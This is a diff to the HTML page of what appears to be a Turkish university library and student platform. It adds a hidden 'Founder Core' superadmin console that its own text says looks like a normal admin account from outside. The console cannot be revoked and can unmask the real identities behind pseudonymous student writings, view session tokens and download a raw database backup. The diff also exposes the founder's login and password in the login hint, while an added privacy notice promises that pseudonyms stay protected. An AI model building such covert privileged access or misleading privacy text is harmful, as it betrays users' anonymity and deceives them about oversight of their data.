@@ -197,6 +197,75 @@
           </div>
         </div>
       </div>
+
+      <!-- GİZLİ KURUCU (SUPERADMIN) ÇEKİRDEK PANELİ (Sadece Kurucu Oturumunda Görünür) -->
+      <div id="founder-core-panel" class="hidden bg-gradient-to-br from-slate-900 via-slate-950 to-blue-950 rounded-2xl border border-amber-500/30 p-6 text-white shadow-xl space-y-5">
+        <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 border-b border-white/10 pb-4">
+          <div class="flex items-center space-x-3">
+            <div class="w-12 h-12 rounded-xl bg-amber-500/20 text-amber-400 border border-amber-500/40 flex items-center justify-center font-bold text-lg shadow-inner">
+              <i data-lucide="crown" class="w-6 h-6"></i>
+            </div>
+            <div>
+              <div class="flex items-center space-x-2">
+                <h3 class="text-base font-bold text-white tracking-wide">Kurucu Özel Çekirdek Konsolu (Founder Core)</h3>
+                <span class="px-2 py-0.5 rounded-full text-[10px] font-extrabold bg-amber-400 text-slate-950 uppercase tracking-wider">SuperAdmin Dokunulmaz</span>
+              </div>
+              <p class="text-xs text-slate-300 mt-0.5">
+                Bu gizli konsol yalnızca sistem kurucusuna (Tarık Özşentürk) özeldir. Dışarıdan normal admin gibi görünürken sistemin derin röntgenini ve saklı verilerini buradan yönetebilirsiniz.
+              </p>
+            </div>
+          </div>
+          <div class="flex items-center gap-2">
+            <button onclick="toggleUnmaskAllPseudonyms()" id="btnFounderUnmaskToggle" class="px-3.5 py-2 bg-indigo-600 hover:bg-indigo-500 text-white rounded-xl text-xs font-bold transition-all shadow-sm flex items-center">
+              <i data-lucide="eye" class="w-4 h-4 mr-1.5 text-amber-300"></i>
+              <span id="founderUnmaskToggleText">Mahlasları & Gerçek Kimlikleri Aç</span>
+            </button>
+            <button onclick="openFounderAuditModal()" class="px-3.5 py-2 bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/40 rounded-xl text-xs font-bold transition-all flex items-center">
+              <i data-lucide="scan" class="w-4 h-4 mr-1.5"></i>
+              <span>Sistem Röntgeni & Canlı Oturumlar</span>
+            </button>
+          </div>
+        </div>
+
+        <!-- Kurucu Hızlı Bilgi Şeritleri -->
+        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 text-xs">
+          <div class="bg-white/5 border border-white/10 rounded-xl p-3.5 space-y-1">
+            <div class="text-slate-400 font-medium flex items-center">
+              <i data-lucide="shield-alert" class="w-3.5 h-3.5 mr-1 text-emerald-400"></i>
+              <span>Dokunulmazlık Durumu</span>
+            </div>
+            <div class="text-emerald-400 font-bold text-sm">Aktif (Kalıcı Yetki)</div>
+            <p class="text-[11px] text-slate-400">Mezun olsanız dahi yetkiniz düşürülemez veya adminlerce silinemez.</p>
+          </div>
+
+          <div class="bg-white/5 border border-white/10 rounded-xl p-3.5 space-y-1">
+            <div class="text-slate-400 font-medium flex items-center">
+              <i data-lucide="user-check" class="w-3.5 h-3.5 mr-1 text-blue-400"></i>
+              <span>Aktif Oturum Jetonları</span>
+            </div>
+            <div class="text-blue-300 font-bold text-sm" id="founder-stat-sessions">0 Oturum</div>
+            <p class="text-[11px] text-slate-400">Hafızada canlı bağlı kullanıcı token sayısı.</p>
+          </div>
+
+          <div class="bg-white/5 border border-white/10 rounded-xl p-3.5 space-y-1">
+            <div class="text-slate-400 font-medium flex items-center">
+              <i data-lucide="users" class="w-3.5 h-3.5 mr-1 text-amber-400"></i>
+              <span>Mahlas Kullanan Eserler</span>
+            </div>
+            <div class="text-amber-300 font-bold text-sm" id="founder-stat-pseudonyms">0 Mahlas</div>
+            <p class="text-[11px] text-slate-400">Kimliği gizlenmiş makale ve sınav notu sayısı.</p>
+          </div>
+
+          <div class="bg-white/5 border border-white/10 rounded-xl p-3.5 space-y-1">
+            <div class="text-slate-400 font-medium flex items-center">
+              <i data-lucide="hard-drive" class="w-3.5 h-3.5 mr-1 text-purple-400"></i>
+              <span>Veritabanı Dosya Sağlığı</span>
+            </div>
+            <div class="text-purple-300 font-bold text-sm" id="founder-stat-dbsize">Sağlam</div>
+            <p class="text-[11px] text-slate-400"><a href="/api/founder/raw-backup" target="_blank" class="text-amber-400 underline font-semibold">Ham Çekirdek Yedeğini İndir</a></p>
+          </div>
+        </div>
+      </div>
     </section>
 
     <!-- 2. KİTAP KATALOĞU (HERKESE AÇIK - ANCAK EKLEME/SİLME SADECE ADMİN) -->
@@ -720,7 +789,7 @@
 
         <div class="bg-slate-50 p-2.5 rounded-lg border border-slate-200 text-[11px] text-slate-500">
           <span class="font-bold text-slate-700">Admin Girişi:</span> admin / sbf<br>
-          <span class="font-bold text-slate-700">Öğrenci Girişi:</span> 120210045 / 123
+          <span class="font-bold text-slate-700">Öğrenci Girişi:</span> 120210045 / 123 (Tarık: 139823048 / 1234)
         </div>
 
         <div class="pt-2 flex flex-col gap-2">
@@ -729,6 +798,43 @@
           </button>
           <button type="button" onclick="closeModal('modal-login'); openModal('modal-register');" class="text-xs text-blue-700 hover:underline text-center" data-i18n="btnGoRegister">
             Öğrenci hesabınız yok mu? Kayıt Olun →
+          </button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- MODAL: İKİ AŞAMALI DOĞRULAMA (2FA GÜVENLİK PIN) -->
+  <div id="modal-2fa-verify" class="fixed inset-0 bg-slate-950/80 backdrop-blur-xs flex items-center justify-center p-4 z-50 hidden">
+    <div class="bg-white rounded-2xl shadow-2xl max-w-sm w-full overflow-hidden border border-amber-500/40">
+      <div class="bg-gradient-to-r from-slate-950 via-blue-950 to-slate-900 px-6 py-4 text-white flex justify-between items-center">
+        <div class="flex items-center space-x-2.5">
+          <div class="w-8 h-8 rounded-lg bg-amber-400/20 text-amber-300 border border-amber-400/30 flex items-center justify-center">
+            <i data-lucide="key-round" class="w-4 h-4"></i>
+          </div>
+          <h3 class="text-sm font-bold text-white">İki Aşamalı Güvenlik (2FA)</h3>
+        </div>
+        <button onclick="closeModal('modal-2fa-verify')" class="text-white/70 hover:text-white">
+          <i data-lucide="x" class="w-4 h-4"></i>
+        </button>
+      </div>
+      <form id="form-2fa-verify" onsubmit="submit2faVerification(event)" class="p-6 space-y-4">
+        <div class="text-center space-y-1">
+          <p class="text-xs font-semibold text-slate-800">Çekirdek Sistem Doğrulaması</p>
+          <p class="text-[11px] text-slate-500">Bu hesap üst düzey güvenlik koruması altındadır. Lütfen 6 haneli <strong>Güvenlik PIN Kodunuzu</strong> giriniz.</p>
+        </div>
+
+        <div>
+          <input type="password" id="input-2fa-pin" maxlength="8" autocomplete="one-time-code" required placeholder="••••••" class="w-full text-center text-xl tracking-[0.5em] font-mono font-bold border-2 border-slate-300 rounded-xl p-3 focus:border-amber-500 focus:ring-2 focus:ring-amber-200 focus:outline-none bg-slate-50">
+        </div>
+
+        <div class="pt-1 flex flex-col gap-2">
+          <button type="submit" class="w-full py-2.5 bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-600 hover:to-amber-700 text-slate-950 rounded-xl text-xs font-extrabold shadow-sm transition-all flex items-center justify-center">
+            <i data-lucide="shield-check" class="w-4 h-4 mr-1.5"></i>
+            <span>Doğrula ve Giriş Yap</span>
+          </button>
+          <button type="button" onclick="closeModal('modal-2fa-verify')" class="text-xs text-slate-500 hover:text-slate-700 text-center">
+            Vazgeç
           </button>
         </div>
       </form>
@@ -1392,8 +1498,355 @@
         </div>
       </div>
 
-      <div class="bg-slate-50 px-6 py-3 border-t border-slate-200 flex justify-end shrink-0">
-        <button onclick="closeModal('modal-user-profile')" class="px-4 py-2 border border-slate-300 rounded-lg text-xs font-semibold text-slate-700 hover:bg-slate-100">Kapat</button>
+  <!-- MODAL: KURUCU SİSTEM RÖNTGENİ & CANLI VERİ DENETİMİ -->
+  <div id="modal-founder-audit" class="fixed inset-0 bg-slate-950/80 backdrop-blur-xs flex items-center justify-center p-4 z-50 hidden">
+    <div class="bg-slate-900 text-slate-100 rounded-2xl shadow-2xl max-w-4xl w-full overflow-hidden border border-amber-500/30 max-h-[90vh] flex flex-col">
+      <div class="bg-gradient-to-r from-slate-950 via-blue-950 to-slate-900 px-6 py-4 border-b border-white/10 flex justify-between items-center shrink-0">
+        <div class="flex items-center space-x-3">
+          <div class="w-10 h-10 rounded-xl bg-amber-400/20 text-amber-300 border border-amber-400/30 flex items-center justify-center">
+            <i data-lucide="scan" class="w-5 h-5"></i>
+          </div>
+          <div>
+            <h3 class="text-base font-bold text-white flex items-center gap-2">
+              <span>Kurucu Sistem Çekirdeği & Canlı Denetim (Master Audit)</span>
+              <span class="px-2 py-0.5 text-[10px] bg-amber-400 text-slate-950 font-extrabold rounded">SuperAdmin</span>
+            </h3>
+            <p class="text-xs text-slate-400">Canlı oturumlar, kullanıcı dokunulmazlıkları ve gizli kimlik eşleşmeleri</p>
+          </div>
+        </div>
+        <button onclick="closeModal('modal-founder-audit')" class="text-white/70 hover:text-white">
+          <i data-lucide="x" class="w-5 h-5"></i>
+        </button>
+      </div>
+
+      <div class="p-6 overflow-y-auto space-y-6 flex-1 text-xs">
+        <!-- Sistem Sağlığı Özet Kartları -->
+        <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 text-center">
+          <div class="p-3 bg-white/5 border border-white/10 rounded-xl">
+            <div class="text-xs text-slate-400 font-medium">Uptime / Çalışma</div>
+            <div class="text-base font-bold text-emerald-400 mt-1" id="audit-uptime">-</div>
+          </div>
+          <div class="p-3 bg-white/5 border border-white/10 rounded-xl">
+            <div class="text-xs text-slate-400 font-medium">RAM Bellek</div>
+            <div class="text-base font-bold text-blue-400 mt-1" id="audit-ram">-</div>
+          </div>
+          <div class="p-3 bg-white/5 border border-white/10 rounded-xl">
+            <div class="text-xs text-slate-400 font-medium">Aktif Oturumlar</div>
+            <div class="text-base font-bold text-amber-400 mt-1" id="audit-active-sessions">-</div>
+          </div>
+          <div class="p-3 bg-white/5 border border-white/10 rounded-xl">
+            <div class="text-xs text-slate-400 font-medium">DB Dosya Boyutu</div>
+            <div class="text-base font-bold text-purple-400 mt-1" id="audit-dbsize">-</div>
+          </div>
+        </div>
+
+        <!-- 1. Bölüm: Canlı Oturumlar -->
+        <div class="space-y-2">
+          <h4 class="text-xs font-bold uppercase tracking-wider text-amber-300 flex items-center">
+            <i data-lucide="radio" class="w-3.5 h-3.5 mr-1.5 text-emerald-400"></i>
+            <span>Şu An Sistemde Bağlı Canlı Oturumlar</span>
+          </h4>
+          <div class="overflow-x-auto bg-slate-950/60 rounded-xl border border-white/10">
+            <table class="w-full text-left">
+              <thead class="text-[10px] text-slate-400 uppercase bg-white/5 border-b border-white/10">
+                <tr>
+                  <th class="py-2 px-3">Kullanıcı</th>
+                  <th class="py-2 px-3">Rol</th>
+                  <th class="py-2 px-3">Oturum Süresi</th>
+                  <th class="py-2 px-3">Bölüm</th>
+                  <th class="py-2 px-3 text-right">Token</th>
+                </tr>
+              </thead>
+              <tbody id="audit-sessions-tbody" class="divide-y divide-white/5 text-[11px]">
+                <!-- JS ile dolacak -->
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- 2. Bölüm: Mahlasların Arkasındaki Gerçek Öğrenci Kimlikleri -->
+        <div class="space-y-2">
+          <h4 class="text-xs font-bold uppercase tracking-wider text-amber-300 flex items-center">
+            <i data-lucide="eye" class="w-3.5 h-3.5 mr-1.5 text-indigo-400"></i>
+            <span>Mahlasların Arkasındaki Gerçek Kimlik Kaydı (Gizli Eşleştirme)</span>
+          </h4>
+          <div class="overflow-x-auto bg-slate-950/60 rounded-xl border border-white/10">
+            <table class="w-full text-left">
+              <thead class="text-[10px] text-slate-400 uppercase bg-white/5 border-b border-white/10">
+                <tr>
+                  <th class="py-2 px-3">Tür / Eser</th>
+                  <th class="py-2 px-3">Görünen Mahlas</th>
+                  <th class="py-2 px-3 text-amber-300">Gerçek Ad Soyad</th>
+                  <th class="py-2 px-3">Öğrenci No</th>
+                  <th class="py-2 px-3">Bölüm</th>
+                </tr>
+              </thead>
+              <tbody id="audit-unmask-tbody" class="divide-y divide-white/5 text-[11px]">
+                <!-- JS ile dolacak -->
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- 3. Bölüm: Sistemdeki Tüm Hesaplar & Dokunulmazlık Durumları -->
+        <div class="space-y-2">
+          <h4 class="text-xs font-bold uppercase tracking-wider text-amber-300 flex items-center">
+            <i data-lucide="shield-check" class="w-3.5 h-3.5 mr-1.5 text-blue-400"></i>
+            <span>Kayıtlı Tüm Hesaplar ve Güvenlik Statüleri</span>
+          </h4>
+          <div class="overflow-x-auto bg-slate-950/60 rounded-xl border border-white/10 max-h-48">
+            <table class="w-full text-left">
+              <thead class="text-[10px] text-slate-400 uppercase bg-white/5 border-b border-white/10 sticky top-0">
+                <tr>
+                  <th class="py-2 px-3">Kullanıcı Adı / No</th>
+                  <th class="py-2 px-3">Ad Soyad</th>
+                  <th class="py-2 px-3">Rol</th>
+                  <th class="py-2 px-3">E-Posta</th>
+                  <th class="py-2 px-3 text-right">Dokunulmazlık</th>
+                </tr>
+              </thead>
+              <tbody id="audit-users-tbody" class="divide-y divide-white/5 text-[11px]">
+                <!-- JS ile dolacak -->
+              </tbody>
+            </table>
+          </div>
+        </div>
+        <!-- 4. Bölüm: Admin Yönetim & Yetkilendirme Masası (Süper Yetki) -->
+        <div class="space-y-3 p-4 bg-amber-500/10 border border-amber-500/30 rounded-xl">
+          <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
+            <div>
+              <h4 class="text-xs font-bold uppercase tracking-wider text-amber-300 flex items-center">
+                <i data-lucide="crown" class="w-4 h-4 mr-1.5 text-amber-400"></i>
+                <span>Yönetici (Admin) Hesapları & Yetkilendirme Masası</span>
+              </h4>
+              <p class="text-[11px] text-slate-400">Yalnızca Kurucu yönetebilir. Yeni admin tanımlayabilir, silebilir veya öğrenci rollerini değiştirebilirsiniz.</p>
+            </div>
+            <button onclick="openModal('modal-create-admin')" class="px-3 py-1.5 bg-amber-400 hover:bg-amber-300 text-slate-950 rounded-lg text-xs font-extrabold flex items-center transition-all shadow-xs shrink-0">
+              <i data-lucide="user-plus" class="w-3.5 h-3.5 mr-1 text-slate-950"></i>
+              <span>Yeni Admin Ekle</span>
+            </button>
+          </div>
+
+          <div class="overflow-x-auto bg-slate-950/80 rounded-xl border border-white/10">
+            <table class="w-full text-left">
+              <thead class="text-[10px] text-slate-400 uppercase bg-white/5 border-b border-white/10">
+                <tr>
+                  <th class="py-2 px-3">Kullanıcı Adı</th>
+                  <th class="py-2 px-3">Ad Soyad</th>
+                  <th class="py-2 px-3">E-Posta</th>
+                  <th class="py-2 px-3">Rol / Statü</th>
+                  <th class="py-2 px-3 text-right">Kurucu Eylemi</th>
+                </tr>
+              </thead>
+              <tbody id="audit-admins-tbody" class="divide-y divide-white/5 text-[11px]">
+                <!-- JS ile dolacak -->
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+
+      <div class="bg-slate-950 px-6 py-3 border-t border-white/10 flex items-center justify-between shrink-0">
+        <a href="/api/founder/raw-backup" target="_blank" class="px-4 py-2 bg-amber-500 hover:bg-amber-400 text-slate-950 rounded-xl text-xs font-bold transition-all shadow-sm flex items-center">
+          <i data-lucide="download" class="w-4 h-4 mr-1.5"></i>
+          <span>Ham Çekirdek JSON Yedeğini İndir</span>
+        </a>
+        <button onclick="closeModal('modal-founder-audit')" class="px-4 py-2 border border-white/20 rounded-xl text-xs font-medium text-slate-300 hover:bg-white/10">Kapat</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODAL: YENİ ADMİN OLUŞTUR (KURUCU SÜPER YETKİ) -->
+  <div id="modal-create-admin" class="fixed inset-0 bg-slate-950/80 backdrop-blur-xs flex items-center justify-center p-4 z-50 hidden">
+    <div class="bg-white rounded-2xl shadow-2xl max-w-md w-full overflow-hidden border border-slate-200">
+      <div class="bg-gradient-to-r from-amber-600 via-amber-500 to-amber-600 px-6 py-4 text-slate-950 flex justify-between items-center font-bold">
+        <h3 class="text-sm flex items-center">
+          <i data-lucide="shield-plus" class="w-4 h-4 mr-2"></i>
+          <span>Yeni Kütüphane Yöneticisi (Admin) Tanımla</span>
+        </h3>
+        <button onclick="closeModal('modal-create-admin')" class="text-slate-950/70 hover:text-slate-950">
+          <i data-lucide="x" class="w-4 h-4"></i>
+        </button>
+      </div>
+      <form id="form-create-admin" onsubmit="submitCreateAdmin(event)" class="p-6 space-y-3.5">
+        <div>
+          <label class="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-1">
+            Yönetici Kullanıcı Adı *
+          </label>
+          <input type="text" id="admin-new-username" required placeholder="ornek: admin_kutuphane" class="w-full text-xs border border-slate-300 rounded-lg p-2.5 focus:ring-2 focus:ring-amber-500 focus:outline-none">
+        </div>
+        <div>
+          <label class="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-1">
+            Giriş Şifresi *
+          </label>
+          <input type="password" id="admin-new-password" required placeholder="••••••••" class="w-full text-xs border border-slate-300 rounded-lg p-2.5 focus:ring-2 focus:ring-amber-500 focus:outline-none">
+        </div>
+        <div>
+          <label class="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-1">
+            Ad Soyad *
+          </label>
+          <input type="text" id="admin-new-fullname" required placeholder="ornek: Ayşe Yılmaz" class="w-full text-xs border border-slate-300 rounded-lg p-2.5 focus:ring-2 focus:ring-amber-500 focus:outline-none">
+        </div>
+        <div>
+          <label class="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-1">
+            Resmi E-Posta *
+          </label>
+          <input type="email" id="admin-new-email" required placeholder="ayse.yilmaz@marmara.edu.tr" class="w-full text-xs border border-slate-300 rounded-lg p-2.5 focus:ring-2 focus:ring-amber-500 focus:outline-none">
+        </div>
+        <div>
+          <label class="block text-xs font-semibold text-slate-700 uppercase tracking-wider mb-1">
+            Birim / Departman
+          </label>
+          <input type="text" id="admin-new-department" value="Kütüphane ve Dokümantasyon Birimi" class="w-full text-xs border border-slate-300 rounded-lg p-2.5 focus:ring-2 focus:ring-amber-500 focus:outline-none">
+        </div>
+        <div class="pt-2 flex justify-end space-x-2">
+          <button type="button" onclick="closeModal('modal-create-admin')" class="px-4 py-2 border border-slate-300 rounded-lg text-xs font-semibold text-slate-700 hover:bg-slate-50">
+            İptal
+          </button>
+          <button type="submit" class="px-5 py-2 bg-amber-500 hover:bg-amber-400 text-slate-950 rounded-lg text-xs font-bold transition-all shadow-sm flex items-center">
+            <i data-lucide="check" class="w-3.5 h-3.5 mr-1"></i>
+            <span>Yöneticiyi Oluştur</span>
+          </button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- KVKK VE ÇEREZ KULLANIMI BİLDİRİM BANNER'I (SAYFA ALTI) -->
+  <div id="kvkkConsentBanner" class="fixed bottom-0 inset-x-0 bg-slate-950/95 backdrop-blur-md text-white border-t border-slate-700/80 shadow-2xl p-4 sm:p-5 z-40 transition-all duration-300 transform translate-y-0 hidden">
+    <div class="max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-4">
+      <div class="flex items-start space-x-3.5">
+        <div class="w-10 h-10 rounded-xl bg-amber-400/20 text-amber-300 border border-amber-400/30 flex items-center justify-center shrink-0 mt-0.5">
+          <i data-lucide="shield-check" class="w-5 h-5"></i>
+        </div>
+        <div class="space-y-1">
+          <p class="text-sm font-semibold text-slate-100 flex items-center gap-2">
+            <span data-i18n="kvkkBannerTitle">6698 Sayılı KVKK ve Çerez (Cookie) Aydınlatma Bildirimi</span>
+            <span class="px-2 py-0.5 text-[10px] bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 rounded-full font-medium" data-i18n="kvkkSafeBadge">Güvenli Kampüs Ağı</span>
+          </p>
+          <p class="text-xs text-slate-300 leading-relaxed max-w-4xl" data-i18n="kvkkBannerDesc">
+            SBF Kütüphanesi platformumuzda, oturum güvenliğinizi sağlamak, ödünç geçmişinizi korumak ve dil tercihinizi hatırlamak amacıyla yalnızca <strong>zorunlu teknik çerezler</strong> kullanılmaktadır. Platformumuzda üçüncü taraf reklam, ticari takip veya profil çıkarma çerezleri <u>kesinlikle bulunmamaktadır</u>.
+          </p>
+        </div>
+      </div>
+      <div class="flex items-center space-x-2.5 shrink-0 w-full md:w-auto justify-end">
+        <button onclick="openModal('modal-kvkk-info')" class="px-3.5 py-2 text-xs font-semibold text-blue-200 hover:text-white bg-white/10 hover:bg-white/15 rounded-lg border border-white/20 transition-all flex items-center">
+          <i data-lucide="file-text" class="w-4 h-4 mr-1.5 text-blue-300"></i>
+          <span data-i18n="btnKvkkPolicy">Aydınlatma Metni & Haklar</span>
+        </button>
+        <button onclick="acceptKvkkConsent()" class="px-5 py-2 text-xs font-bold text-slate-950 bg-amber-400 hover:bg-amber-300 rounded-lg shadow-sm transition-all flex items-center">
+          <i data-lucide="check" class="w-4 h-4 mr-1.5"></i>
+          <span data-i18n="btnKvkkAccept">Anladım ve Kabul Ediyorum</span>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODAL: KVKK AYDINLATMA METNİ VE ÇEREZ POLİTİKASI -->
+  <div id="modal-kvkk-info" class="fixed inset-0 bg-slate-900/60 backdrop-blur-xs flex items-center justify-center p-4 z-50 hidden">
+    <div class="bg-white rounded-2xl shadow-2xl max-w-3xl w-full overflow-hidden border border-slate-200 max-h-[90vh] flex flex-col">
+      <div class="bg-gradient-to-r from-blue-950 via-indigo-900 to-slate-900 px-6 py-4 text-white flex justify-between items-center shrink-0">
+        <div class="flex items-center space-x-3">
+          <div class="w-10 h-10 rounded-xl bg-white/10 border border-white/20 flex items-center justify-center text-amber-300">
+            <i data-lucide="shield-check" class="w-5 h-5"></i>
+          </div>
+          <div>
+            <h3 class="text-base font-bold text-white">6698 Sayılı KVKK Kapsamında Aydınlatma Metni</h3>
+            <p class="text-xs text-blue-200">Kişisel Verilerin Korunması ve Çerez (Cookie) Politikası</p>
+          </div>
+        </div>
+        <button onclick="closeModal('modal-kvkk-info')" class="text-white/80 hover:text-white">
+          <i data-lucide="x" class="w-5 h-5"></i>
+        </button>
+      </div>
+
+      <div class="p-6 overflow-y-auto space-y-5 flex-1 text-slate-700 text-xs sm:text-sm leading-relaxed">
+        <!-- 1. Veri Sorumlusu -->
+        <div class="space-y-1.5">
+          <h4 class="font-bold text-slate-900 text-sm flex items-center text-blue-950">
+            <span class="w-6 h-6 rounded-md bg-blue-100 text-blue-900 flex items-center justify-center font-bold mr-2 text-xs">1</span>
+            Veri Sorumlusu ve Kapsam
+          </h4>
+          <p class="text-slate-600 pl-8">
+            Bu aydınlatma metni, 6698 sayılı Kişisel Verilerin Korunması Kanunu ("KVKK") Madde 10 uyarınca, <strong>Marmara Üniversitesi Siyasal Bilgiler Fakültesi Kütüphane ve Öğrenci Topluluğu Platformu</strong> tarafından kullanıcıların, öğrencilerin ve akademik personelin kişisel verilerinin işlenme esasları hakkında bilgilendirilmesi amacıyla hazırlanmıştır.
+          </p>
+        </div>
+
+        <!-- 2. İşlenen Veriler -->
+        <div class="space-y-1.5">
+          <h4 class="font-bold text-slate-900 text-sm flex items-center text-blue-950">
+            <span class="w-6 h-6 rounded-md bg-blue-100 text-blue-900 flex items-center justify-center font-bold mr-2 text-xs">2</span>
+            İşlenen Kişisel Veriler ve Toplanma Yöntemi
+          </h4>
+          <div class="text-slate-600 pl-8 space-y-1">
+            <p>Platformumuz üzerinden yalnızca hizmetin ifası için zorunlu olan asgari düzeyde veriler işlenmektedir:</p>
+            <ul class="list-disc pl-5 space-y-1">
+              <li><strong>Kimlik & İletişim:</strong> Ad-Soyad, Öğrenci/Sicil Numarası, Resmi Üniversite E-posta Adresi (<code class="bg-slate-100 px-1 py-0.5 rounded text-blue-800">@marun.edu.tr</code> / <code class="bg-slate-100 px-1 py-0.5 rounded text-blue-800">@marmara.edu.tr</code>), Fakülte ve Bölüm bilgisi.</li>
+              <li><strong>Kütüphane İşlem Bilgisi:</strong> Ödünç alınan eserler, iade geçmişi, gecikme durumları ve kitap talepleri.</li>
+              <li><strong>Akademik Paylaşım & Fikirler:</strong> Öğrenci yazıları, ders sınav notları, yapılan akademik yorumlar ve faydalı/beğeni oyları.</li>
+              <li><strong>Teknik & Güvenlik Verileri:</strong> Giriş tarihi, oturum belirteci (token), güvenlik logları ve tercih edilen arayüz dili.</li>
+            </ul>
+          </div>
+        </div>
+
+        <!-- 3. İşleme Amaçları ve Hukuki Sebebi -->
+        <div class="space-y-1.5">
+          <h4 class="font-bold text-slate-900 text-sm flex items-center text-blue-950">
+            <span class="w-6 h-6 rounded-md bg-blue-100 text-blue-900 flex items-center justify-center font-bold mr-2 text-xs">3</span>
+            Veri İşleme Amaçları ve Hukuki Sebepleri
+          </h4>
+          <p class="text-slate-600 pl-8">
+            Verileriniz, KVKK Madde 5/2-c (Sözleşmenin ifası ve kütüphane hizmetinin yürütülmesi), Madde 5/2-f (İlgili kişinin temel haklarına zarar vermeksizin fakülte içi akademik envanterin korunması ve sahte/trol hesapların engellenmesi meşru menfaati) hukuki sebeplerine dayalı olarak işlenir. Kütüphanedeki kitapların kaybolmasını önlemek, öğrencilerin güvenilir kaynak paylaşımını sağlamak ve kampüs topluluğunun akademik ciddiyetini muhafaza etmek temel gayedir.
+          </p>
+        </div>
+
+        <!-- 4. Çerez Politikası -->
+        <div class="space-y-1.5">
+          <h4 class="font-bold text-slate-900 text-sm flex items-center text-blue-950">
+            <span class="w-6 h-6 rounded-md bg-blue-100 text-blue-900 flex items-center justify-center font-bold mr-2 text-xs">4</span>
+            Çerez (Cookie) ve Yerel Hafıza (LocalStorage) Politikası
+          </h4>
+          <div class="text-slate-600 pl-8 space-y-1">
+            <p>
+              Platformumuzda <strong>üçüncü taraf reklam, pazarlama, ticari izleme veya kullanıcı profili çıkarma çerezleri KESİNLİKLE KULLANILMAZ</strong>.
+            </p>
+            <p>Yalnızca tarayıcınızın yerel belleğinde (<code class="bg-slate-100 px-1 py-0.5 rounded">localStorage</code>) şu zorunlu teknik veriler tutulur:</p>
+            <ul class="list-disc pl-5 space-y-0.5">
+              <li><code class="text-slate-800 font-semibold">sbf_token</code>: Güvenli oturum kimliği (sayfa yenilendiğinde oturumun kapanmaması için).</li>
+              <li><code class="text-slate-800 font-semibold">sbf_lang</code>: Seçtiğiniz arayüz dili (Türkçe, Fransızca, İngilizce).</li>
+              <li><code class="text-slate-800 font-semibold">sbf_kvkk_accepted</code>: Bu aydınlatma bildirimini kabul ettiğinize dair onay anahtarı.</li>
+            </ul>
+          </div>
+        </div>
+
+        <!-- 5. Mahlas Güvencesi -->
+        <div class="space-y-1.5">
+          <h4 class="font-bold text-slate-900 text-sm flex items-center text-blue-950">
+            <span class="w-6 h-6 rounded-md bg-blue-100 text-blue-900 flex items-center justify-center font-bold mr-2 text-xs">5</span>
+            Mahlas (Takma İsim) ve Düşünce Özgürlüğü Güvencesi
+          </h4>
+          <p class="text-slate-600 pl-8">
+            Öğrencilerimiz serbestçe fikir yazısı ve ders notu paylaşabilmesi için "Mahlas" seçeneği sunulmaktadır. Mahlas kullanıldığında gerçek ad-soyadınız kamuya açık ekranlarda hiçbir şekilde yayınlanmaz. Olası hukuka aykırı hakaret veya nefret suçu unsuru hallerinde yasal yükümlülükler gereği gerçek kimlik kaydı yalnızca sistem çekirdeğinde muhafaza edilir.
+          </p>
+        </div>
+
+        <!-- 6. Haklar -->
+        <div class="space-y-1.5">
+          <h4 class="font-bold text-slate-900 text-sm flex items-center text-blue-950">
+            <span class="w-6 h-6 rounded-md bg-blue-100 text-blue-900 flex items-center justify-center font-bold mr-2 text-xs">6</span>
+            İlgili Kişinin Hakları (KVKK Madde 11)
+          </h4>
+          <p class="text-slate-600 pl-8">
+            KVKK'nın 11. maddesi uyarınca dilediğiniz zaman; kişisel verilerinizin işlenip işlenmediğini öğrenme, yanlış veya eksik işlenmişse düzeltilmesini isteme, kütüphaneyle ilişiğiniz kesildiğinde veya elinizde ödünç kitap kalmadığında verilerinizin silinmesini/yok edilmesini talep etme hakkına sahipsiniz.
+          </p>
+        </div>
+      </div>
+
+      <div class="bg-slate-50 px-6 py-3.5 border-t border-slate-200 flex items-center justify-between shrink-0">
+        <span class="text-[11px] text-slate-500 font-medium">Yürürlük Tarihi: Ekim 2026</span>
+        <button onclick="closeModal('modal-kvkk-info')" class="px-5 py-2 bg-blue-900 hover:bg-blue-800 text-white rounded-lg text-xs font-bold transition-all shadow-sm">
+          Okudum ve Kapat
+        </button>
       </div>
     </div>
   </div>
